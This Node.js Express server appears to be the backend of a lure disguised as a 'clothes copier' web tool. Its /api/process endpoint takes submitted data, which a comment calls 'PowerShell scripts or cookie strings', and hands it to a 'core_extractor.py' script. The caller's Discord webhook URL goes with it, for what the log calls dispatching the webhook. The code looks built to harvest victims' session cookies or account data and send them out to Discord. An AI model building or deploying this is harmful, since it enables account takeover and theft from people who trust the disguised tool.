const express = require('express');
const { execFile } = require('child_process');
const path = require('path');

const app = express();

// Increase payload limits so massive PowerShell scripts or cookie strings don't get rejected
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// Serve frontend static files
app.use(express.static(path.join(__dirname)));

// Explicit root route handler to serve clothes-copier.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'clothes-copier.html'));
});

app.post('/api/process', (req, res) => {
    const { data, webhook } = req.body;

    if (!data || !webhook) {
        return res.status(400).json({ success: false, error: "Missing data or webhook" });
    }

    console.log(`[Node Debug] Received payload -> Length: ${data.length}, Start: ${data.substring(0, 30)}...`);

    execFile('python3', ['core_extractor.py', data], {
        env: { ...process.env, DISCORD_WEBHOOK_URL: webhook }
    }, (error, stdout, stderr) => {
        if (error) {
            console.error("Python Execution Error:", stderr || error.message);
            return res.status(500).json({ 
                success: false, 
                error: "Extractor execution failed.", 
                details: stderr || error.message 
            });
        }

        console.log("[Node Debug] Python script executed successfully and dispatched webhook.");
        res.json({ success: true, output: stdout });
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Server running locally on http://localhost:${PORT}`);
});
